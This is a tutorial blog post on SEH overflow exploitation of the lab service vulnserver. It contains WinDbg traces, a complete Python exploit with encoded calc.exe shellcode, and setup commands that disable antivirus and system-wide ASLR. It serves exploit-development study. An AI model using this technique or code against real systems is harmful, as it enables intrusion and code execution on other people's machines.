---
slug: "seh-overflows-hijacking-windows-exception-handlers"

title: "SEH Overflows - Hijacking Windows Exception Handlers"
date: 2026-05-01T13:17:42+05:45
draft: false

description: "A technical walkthrough of SEH-based exploitation on x86 Windows - overwriting exception handler records, POP POP RET mechanics, and island hopping with short and near jumps to deliver shellcode."
tags: [Exploit-Development, x86, OSED, WinDbg, SEH, Stack-Overflow, Shellcode]
categories: [OSED]

cover:
  image: "/img/OSED.png"
  alt: "CIPHERFLARE"
---

## Lab Setup

Three things need to be sorted on the Windows lab machine before any of this works cleanly.

**Antivirus off.** Shellcode and exploit scripts will be flagged and quarantined before they ever run. Real-time protection, tamper protection, SmartScreen, all of it needs to go. Turn off tamper protection first, then real-time protection. If you do it the other way around, Defender re-enables itself.

**ASLR disabled system-wide.** Windows randomizes module base addresses by default, which means every time the program runs, the modules load at different addresses. For foundational exploit development you need those addresses to stay the same between runs so any gadget address you hardcode in a payload is still valid the next time. This registry key forces that:

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v MoveImages /t REG_DWORD /d 0 /f
```

Reboot after applying it.

**DEP disabled for the target binary.** Data Execution Prevention marks stack memory as non-executable at the OS level. If it is enabled, the CPU will refuse to execute code sitting on the stack even if you redirect execution there perfectly. For this lab the binary gets compiled without NX compatibility so the stack stays executable. In real targets this protection gets bypassed with ROP chains rather than compiled away, but that comes later.

---

## What is Structured Exception Handling?

Windows has a built-in mechanism for handling errors at runtime. When something goes wrong inside a running process, like a null pointer dereference, a divide by zero, or an access violation, Windows does not just kill the process immediately. It first gives the process a chance to deal with the exception through a system called Structured Exception Handling, or SEH.

In C code you interact with SEH through `__try` and `__except` blocks:

```c
__try {
    // code that might crash
    strcpy(buf, input);
}
__except(EXCEPTION_EXECUTE_HANDLER) {
    // this runs if something goes wrong
    printf("exception caught\n");
}
```

Under the hood the compiler translates this into a data structure that gets pushed onto the stack. That structure is called an `_EXCEPTION_REGISTRATION_RECORD` and it has exactly two fields:

```
0:003> dt ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next     : Ptr32 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler  : Ptr32 _EXCEPTION_DISPOSITION
```

`Next` is a pointer to the next record in the chain. `Handler` is the address of the function to call when an exception occurs. Each record is 8 bytes. Multiple records are linked together on the stack forming a singly linked list. The last record in the chain has `0xffffffff` as its `Next` pointer, which signals the end of the chain. If Windows walks the entire chain without any handler dealing with the exception, it gives up and calls WerFault.

The head of the chain is always stored at `FS:[0]` in the Thread Environment Block. In WinDbg you can verify this directly:

```
dd fs:[0]
```

And the `!exchain` command walks and displays the entire chain in a readable format.

---

## Why SEH Overflows Are Different From Standard Stack Overflows

In a standard stack overflow the overflow needs to reach the saved return address. The function then has to complete its execution and run through the epilogue before `ret` fires and redirects execution. If the stack is corrupted badly enough that the epilogue fails, the exploit fails.

SEH exploitation does not have this problem. The goal is to overflow past the saved return address and keep going until the overflow reaches an SEH record sitting further up the stack. Once that record is overwritten with controlled values, the exploit triggers an exception on purpose, typically the access violation caused by the overflow itself. Windows then walks the SEH chain, finds the overwritten record, and calls the `Handler` address. If that address points to useful code, execution has been hijacked without the function ever needing to return cleanly.

This makes SEH-based exploitation more reliable in situations where the stack is heavily corrupted.

---

## The Vulnerable Code

Vulnserver's `GMON` command handler checks the length of the received input before calling the vulnerable function:

```c
} else if (strncmp(RecvBuf, "GMON ", 5) == 0) {
    char GmonStatus[13] = "GMON STARTED\n";
    for (i = 5; i < RecvBufLen; i++) {
        if ((char)RecvBuf[i] == '/') {
            if (strlen(RecvBuf) > 3950) {
                Function3(RecvBuf);
            }
            break;
        }
    }
```

The input only reaches `Function3` if it exceeds 3950 bytes. This matters later when we build the payload. Any payload shorter than 3950 bytes total will be silently ignored.

`Function3` is where the actual vulnerability lives:

```c
void Function3(char *Input) {
    char Buffer2S[2000];
    strcpy(Buffer2S, Input);
}
```

`strcpy` copies the full input into a 2000-byte buffer with no length check. Send more than 2000 bytes past the function call and it overflows `Buffer2S`, walks up the stack past saved EBP, past the return address, and eventually reaches SEH records sitting further up the stack.

---

## Crashing the Service and Finding Offsets

The first step is sending a long cyclic pattern to trigger the crash and overwrite the SEH chain with known pattern bytes.

```python
import socket
import pwn

pattern = pwn.cyclic(5000)

s = socket.socket()
s.connect(("192.168.122.85", 9999))
s.recv(1024)
s.send(b"GMON /.:/" + pattern)
s.close()
```

Note the prefix `GMON /.:/ ` in the command. The `/` character is what triggers the length check inside the `GMON` handler. Without it the vulnerable code path is never reached.

With vulnserver running under WinDbg, the crash looks like this:

```
(1ea0.14d0): Access violation - code c0000005 (first chance)
eax=7efefefe ebx=0000013c ecx=007c45c8 edx=7a6a6261 esi=00401848 edi=00f80000
eip=77aab649 esp=00f7f1d4 ebp=00f7f9c4
msvcrt!strcat+0x89:
77aab649 8917    mov dword ptr [edi],edx
```

Running `!exchain` shows the overwritten SEH chain:

```
0:003> !exchain
00f7ffcc: 6e6a6261
Invalid exception stack at 6d6a6261
```

Both fields of the SEH record contain cyclic pattern bytes. Using pwntools to find the offsets:

```bash
pwn cyclic -l 0x6e6a6261   # 3547 -> handler offset
pwn cyclic -l 0x6d6a6261   # 3543 -> nSEH offset
```

The `nSEH` field (`Next`) starts at offset 3543 from the beginning of the input. The `Handler` field starts at offset 3547, four bytes later.

Verifying with marker values:

```python
nseh    = struct.pack("<I", 0xbeefdead)
handler = struct.pack("<I", 0xdeadbeef)

payload  = b"A" * 3543
payload += nseh
payload += handler
payload += b"A" * (3950 - len(payload))
```

Result:

```
0:003> !exchain
00f5ffcc: deadbeef       <- handler confirmed at offset 3547
Invalid exception stack at beefdead  <- nSEH confirmed at offset 3543
```

Both offsets confirmed.

---

## How Windows Calls the Handler

Understanding exactly what happens when Windows calls the exception handler is critical for understanding why `POP POP RET` works.

When an exception fires, Windows calls the registered `Handler` function like a standard cdecl call. Before jumping to it, Windows pushes four arguments onto the stack. The handler's signature is:

```c
EXCEPTION_DISPOSITION handler(
    EXCEPTION_RECORD *ExceptionRecord,   // [ESP+4]  info about the exception
    void             *EstablisherFrame,  // [ESP+8]  address of the SEH record
    CONTEXT          *ContextRecord,     // [ESP+12] full CPU state at crash time
    void             *DispatcherContext  // [ESP+16] internal dispatcher info
);
```

At the moment the handler starts executing, the stack looks like this:

```
High Address
[ DispatcherContext ptr   ]  [ESP+16]
[ ContextRecord ptr       ]  [ESP+12]
[ EstablisherFrame ptr    ]  [ESP+8]   <- points directly at the nSEH field
[ ExceptionRecord ptr     ]  [ESP+4]
[ return address          ]  [ESP]     <- ESP points here
Low Address
```

The second argument, `EstablisherFrame` at `[ESP+8]`, holds the address of the SEH record being dispatched. That is the address of the `nSEH` field, which is exactly where the jump to shellcode needs to be placed.

You can inspect the `EXCEPTION_RECORD` and `CONTEXT` structures directly in WinDbg:

```
0:003> dt ntdll!_EXCEPTION_RECORD
   +0x000 ExceptionCode    : Int4B
   +0x004 ExceptionFlags   : Uint4B
   +0x008 ExceptionRecord  : Ptr32 _EXCEPTION_RECORD
   +0x00c ExceptionAddress : Ptr32 Void
   +0x010 NumberParameters : Uint4B

0:003> dt ntdll!_CONTEXT
   +0x000 ContextFlags     : Uint4B
   +0x09c Edi              : Uint4B
   +0x0a0 Esi              : Uint4B
   +0x0b8 Eip              : Uint4B
   +0x0c4 Esp              : Uint4B
```

The `CONTEXT` structure contains a full snapshot of every CPU register at the moment the exception occurred. A legitimate handler would use this to inspect what went wrong and potentially resume execution. For exploitation purposes, none of it matters. The only thing that matters is `EstablisherFrame` at `[ESP+8]`.

---

## POP POP RET Explained

A direct `RET` from the handler would pop whatever is at ESP into EIP. At that moment ESP points at the return address, which goes back into Windows exception dispatcher code. That is not useful.

Two `POP` instructions move ESP forward by 8 bytes total, skipping past the return address and the `ExceptionRecord` pointer. After two pops, ESP is pointing at `EstablisherFrame`. Then `RET` pops that value into EIP and the CPU jumps to the `nSEH` field.

Walking through it step by step:

```
; Starting state: ESP points at return address
POP ECX   ; read [ESP] into ECX (discarded), ESP moves to [ESP+4]
POP ECX   ; read [ESP] into ECX (discarded), ESP moves to [ESP+8]
RET       ; read [ESP] into EIP (EstablisherFrame = address of nSEH), jump there
```

The register used for each `POP` does not matter at all. The values are thrown away. Any two-register combination works: `POP ECX POP ECX`, `POP EBX POP EAX`, `POP EDI POP ESI`. The only requirement is two POPs followed immediately by a RET.

---

## Finding a POP POP RET Gadget

Not every module is safe to pull a gadget from. SafeSEH is a Windows protection that validates SEH handler addresses before calling them. If the handler address is not in the module's SafeSEH table, Windows rejects it and the exploit fails.

The way to check a module for SafeSEH is by examining its PE header characteristics. `essfunc.dll`, the companion DLL that ships with vulnserver, has zero DLL characteristics:

```
0:000> !dh 62500000
0  DLL characteristics
0  [0] address [size] of Load Configuration Directory
```

Zero DLL characteristics means no SafeSEH flag. No Load Configuration Directory means no SafeSEH table. Addresses from `essfunc` are valid for SEH handler overwrites.

Searching `essfunc` for `POP POP RET` (opcodes `59 59 C3`):

```
0:000> s 0x62500000 L0x8000 59 59 c3
6250120b  59 59 c3 5d c3 55 89 e5...
```

The length `0x8000` comes from the module size in `lm` output: `62508000 - 62500000 = 8000`.

Verifying the gadget:

```
0:000> u 0x6250120b L3
essfunc!EssentialFunc9+0xb:
6250120b 59    pop ecx
6250120c 59    pop ecx
6250120d c3    ret
```

Confirmed. The address `0x6250120b` contains no null bytes (`62 50 12 0b`), so `strcpy` will not truncate the payload at this point.

---

## The Island Hopping Problem

With the offsets and gadget confirmed, `nSEH` needs to contain a jump that eventually reaches shellcode. The natural instinct is to put shellcode right after the handler field and use a short forward jump in `nSEH`. But there is a serious problem with that approach.

After the SEH record at offset 3547, the stack is very close to a page boundary. There are only a handful of bytes of mapped memory before `0x01000000`. A 220-byte shellcode simply does not fit.

The shellcode needs to live in the filler area before the SEH record, where there is over 3500 bytes of available space. But `nSEH` is only 4 bytes, and a short jump (`\xeb`) can only reach 127 bytes forward or 128 bytes backward. Shellcode at the start of the payload is thousands of bytes away.

The solution is a two-stage jump called island hopping:

1. `nSEH` contains a short jump backward 128 bytes, landing in the filler area
2. At the landing point, a near jump (`\xe9`) with a 4-byte signed offset jumps all the way back to the NOP sled

A near jump can reach plus or minus 2GB. No distance restriction whatsoever.

Here is the layout:

```
Offset 0      : NOP sled (16 bytes)
Offset 16     : Shellcode (220 bytes)
Offset 236    : A filler
Offset 3417   : Near jump (5 bytes, jumps back to offset 0)
Offset 3422   : A filler
Offset 3543   : nSEH = \xeb\x80\x90\x90 (short jump back 128 bytes to near jump)
Offset 3547   : Handler = 0x6250120b (PPR gadget in essfunc.dll)
Offset 3551   : A padding
Total         : 3950 bytes
```

`\xeb\x80` is the short jump. `\xeb` is the opcode, `\x80` is the signed offset. In two's complement, `0x80` is -128, meaning jump 128 bytes backward from the end of the instruction. The two `\x90` NOP bytes pad `nSEH` to the required 4 bytes.

The near jump offset calculation:

```python
# Near jump sits at offset 3417
# Target is offset 0 (start of NOP sled)
# Offset = 0 - (3417 + 5) = -3422
# The +5 accounts for the 5-byte instruction itself
near_jump = b"\xe9" + struct.pack("<i", -3422)
```

---

## Execution Trace

Full WinDbg trace of the exploit firing:

**PPR breakpoint hit:**

```
Breakpoint 0 hit
eip=6250120b esp=010ce5d8
essfunc!EssentialFunc9+0xb:
6250120b 59    pop ecx
```

**First POP discards return address:**

```
eip=6250120c esp=010ce5dc
6250120c 59    pop ecx
```

**Second POP discards ExceptionRecord pointer:**

```
eip=6250120d esp=010ce5e0
6250120d c3    ret
```

**RET pops EstablisherFrame into EIP, landing on nSEH:**

```
eip=010cffcc esp=010ce5e4
010cffcc eb80    jmp 010cff4e
```

**Short jump fires, lands on near jump in filler:**

```
eip=010cff4e
010cff4e e9a2f2ffff    jmp 010cf1f5
```

**Near jump fires, lands in NOP sled:**

```
eip=010cf1f5
010cf1f5 90    nop
```

**Memory at landing, NOP sled into shellcode:**

```
0:003> db eip L30
010cf1f5  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
010cf205  d9 cb bd 4a 6d 32 a0 d9-74 24 f4 5b 29 c9 b1 31  ...Jm2..t$.[)..1
010cf215  31 6b 18 83 eb fc 03 6b-5e 8f c7 5c b6 cd 28 9d  1k.....k^..\..(.
```

16 NOPs followed immediately by the first bytes of the shikata_ga_nai encoded shellcode. The decoder runs, unpacks the payload, and `calc.exe` opens on the target.

---

## The Full Exploit

```python
import socket
import struct
import sys

TARGET_IP   = "192.168.122.85"
TARGET_PORT = 9999

def exploit():
    print(f"[*] Target     : {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] Gadget     : PPR @ 0x6250120b (essfunc.dll, no SafeSEH)")
    print(f"[*] Bad chars  : \\x00")
    print(f"[*] Encoder    : x86/shikata_ga_nai")
    print(f"[*] Payload    : windows/exec CMD=calc.exe")

    # msfvenom -p windows/exec CMD=calc.exe -b "\x00" -f python
    buf  = b""
    buf += b"\xd9\xcb\xbd\x4a\x6d\x32\xa0\xd9\x74\x24\xf4\x5b"
    buf += b"\x29\xc9\xb1\x31\x31\x6b\x18\x83\xeb\xfc\x03\x6b"
    buf += b"\x5e\x8f\xc7\x5c\xb6\xcd\x28\x9d\x46\xb2\xa1\x78"
    buf += b"\x77\xf2\xd6\x09\x27\xc2\x9d\x5c\xcb\xa9\xf0\x74"
    buf += b"\x58\xdf\xdc\x7b\xe9\x6a\x3b\xb5\xea\xc7\x7f\xd4"
    buf += b"\x68\x1a\xac\x36\x51\xd5\xa1\x37\x96\x08\x4b\x65"
    buf += b"\x4f\x46\xfe\x9a\xe4\x12\xc3\x11\xb6\xb3\x43\xc5"
    buf += b"\x0e\xb5\x62\x58\x05\xec\xa4\x5a\xca\x84\xec\x44"
    buf += b"\x0f\xa0\xa7\xff\xfb\x5e\x36\xd6\x32\x9e\x95\x17"
    buf += b"\xfb\x6d\xe7\x50\x3b\x8e\x92\xa8\x38\x33\xa5\x6e"
    buf += b"\x43\xef\x20\x75\xe3\x64\x92\x51\x12\xa8\x45\x11"
    buf += b"\x18\x05\x01\x7d\x3c\x98\xc6\xf5\x38\x11\xe9\xd9"
    buf += b"\xc9\x61\xce\xfd\x92\x32\x6f\xa7\x7e\x94\x90\xb7"
    buf += b"\x21\x49\x35\xb3\xcf\x9e\x44\x9e\x85\x61\xda\xa4"
    buf += b"\xeb\x62\xe4\xa6\x5b\x0b\xd5\x2d\x34\x4c\xea\xe7"
    buf += b"\x71\x9f\x71\x97\xed\x48\xdc\x32\x50\x15\xdf\xe8"
    buf += b"\x96\x20\x5c\x19\x66\xd7\x7c\x68\x63\x93\x3a\x80"
    buf += b"\x19\x8c\xae\xa6\x8e\xad\xfa\xc4\x51\x3e\x66\x25"
    buf += b"\xf4\xc6\x0d\x39"

    ppr_gad   = struct.pack("<I", 0x6250120b)  # POP ECX POP ECX RET in essfunc.dll
    nseh      = b"\xeb\x80\x90\x90"            # short jump back 128 bytes + 2 NOPs
    near_jump = b"\xe9" + struct.pack("<i", -3422)  # near jump back to NOP sled

    payload  = b"\x90" * 16                    # NOP sled at offset 0
    payload += buf                              # shellcode at offset 16
    payload += b"A" * (3417 - len(payload))    # filler up to near jump
    payload += near_jump                        # near jump at offset 3417
    payload += b"A" * (3543 - len(payload))    # filler up to nSEH
    payload += nseh                             # nSEH at offset 3543
    payload += ppr_gad                          # handler at offset 3547
    payload += b"A" * (3950 - len(payload))    # padding to trigger vulnerable path

    print(f"[*] Payload    : {len(payload)} bytes")
    print(f"[*] Layout     : [NOP x16][Shellcode][Filler][NearJump][Filler][nSEH][PPR][Pad]")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, TARGET_PORT))
        print(f"[+] Connected")
        s.recv(1024)
        s.send(b"GMON /.:/" + payload)
        print(f"[+] Payload sent")
        s.close()
        print(f"[+] Done. Check target for calc.exe")
    except ConnectionRefusedError:
        print(f"[-] Connection refused. Is the service running?")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    exploit()
```

---

## Payload Layout

```
Offset 0-15      : NOP sled (16 bytes)
Offset 16-235    : shikata_ga_nai encoded shellcode (220 bytes)
Offset 236-3416  : A filler
Offset 3417-3421 : Near jump \xe9 (5 bytes, jumps back to offset 0)
Offset 3422-3542 : A filler
Offset 3543-3546 : nSEH = \xeb\x80\x90\x90 (short jump back 128 bytes)
Offset 3547-3550 : Handler = 0x6250120b (POP POP RET in essfunc.dll)
Offset 3551-3949 : A padding to reach minimum trigger length
Total            : 3950 bytes
```

---

## Key Takeaways

SEH exploitation does not need the function to return cleanly. The overflow itself triggers the exception. Even a completely corrupted stack will still dispatch the exception and call the overwritten handler.

POP POP RET is a precise mechanism, not magic. The handler is called with four arguments pushed on the stack. Two POPs skip past the return address and ExceptionRecord pointer, leaving ESP pointing at EstablisherFrame, which holds the address of the SEH record. RET pops that into EIP and lands on nSEH.

Short jumps only reach 128 bytes in either direction. When shellcode is thousands of bytes away, island hopping solves it. Short jump to near jump, near jump to shellcode. Each hop is limited but together they cover arbitrary distance.

SafeSEH rejects handler addresses not listed in a module's SafeSEH table. Always verify DLL characteristics and Load Configuration Directory before choosing a module as a gadget source. A module with zero DLL characteristics and no Load Configuration Directory is not SafeSEH protected.

Payload size matters for triggering the vulnerable code path. The `GMON` handler only calls `Function3` when the input exceeds 3950 bytes. Sending less does nothing. Always match payload length to what caused the original crash.

The minimum payload size being 3950 bytes is also why the shellcode cannot live after the SEH record. There is almost no stack space left after offset 3950 before hitting a page boundary. Shellcode must live in the filler region before the SEH record and the jump chain must reach backward to it.

---

*This exploit runs against a deliberately vulnerable lab binary compiled without modern mitigations. It is a learning exercise.*